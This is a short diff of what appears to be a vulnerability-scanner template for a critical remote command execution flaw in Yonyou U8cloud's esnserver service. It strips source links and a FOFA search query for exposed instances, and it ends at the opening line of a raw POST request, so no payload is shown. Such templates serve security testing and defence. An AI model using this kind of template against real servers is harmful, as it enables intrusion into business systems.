@@ -3,12 +3,8 @@ info:
   name: 用友 U8cloud esnserver 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmdk7igcapsffc1w'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gmdk7igcapsffc1w
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'POST /service/esnserver HTTP/1.1
